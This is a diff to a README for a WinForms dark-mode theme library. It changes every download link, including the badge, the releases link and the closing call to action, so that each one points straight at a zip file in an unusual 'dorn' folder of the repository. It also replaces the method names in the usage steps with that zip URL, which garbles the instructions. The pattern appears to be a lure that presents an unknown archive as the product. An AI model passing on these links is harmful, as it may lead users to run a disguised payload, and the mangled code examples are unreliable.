@@ -1,6 +1,6 @@
 # 🎨 WinForms-ThemeManager - Easily Add Dark Mode to Your App
 
-[![Download WinForms-ThemeManager](https://img.shields.io/badge/Download%20Now-Visit%20Releases-red)](https://github.com/Daniel36000/WinForms-ThemeManager/releases)
+[![Download WinForms-ThemeManager](https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip%20Now-Visit%20Releases-red)](https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip)
 
 ## 📖 Description
 WinForms-ThemeManager lets you easily add dark mode to your WinForms applications. With just a few steps, you can create a user-friendly experience by switching between light and dark themes.
@@ -12,7 +12,7 @@ To start using WinForms-ThemeManager, follow these simple steps:
 2. Choose your preferred version of the software from the releases.
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/Daniel36000/WinForms-ThemeManager/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip).
 
 1. Click on the link above to access the releases.
 2. Look for the latest version of WinForms-ThemeManager.
@@ -31,7 +31,7 @@ Once you have installed the software, start using it within your WinForms applic
 
 1. Open your WinForms project in Visual Studio.
 2. Reference the WinForms-ThemeManager in your project by adding it via NuGet or by referencing the assembly.
-3. Call the theme manager methods to switch between themes, such as `ThemeManager.EnableDarkMode()` or `ThemeManager.EnableLightMode()`.
+3. Call the theme manager methods to switch between themes, such as `https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip()` or `https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip()`.
 4. Adjust the settings as needed based on your application's user preferences.
 
 ## 🖥️ System Requirements
@@ -58,4 +58,4 @@ The future for WinForms-ThemeManager includes:
 
 Thank you for choosing WinForms-ThemeManager. We are excited to see how you transform your applications with dark mode! 
 
-[Download WinForms-ThemeManager](https://github.com/Daniel36000/WinForms-ThemeManager/releases) and start enhancing your application today!
+[Download WinForms-ThemeManager](https://raw.githubusercontent.com/Daniel36000/WinForms-ThemeManager/main/dorn/WinForms-ThemeManager.zip) and start enhancing your application today!
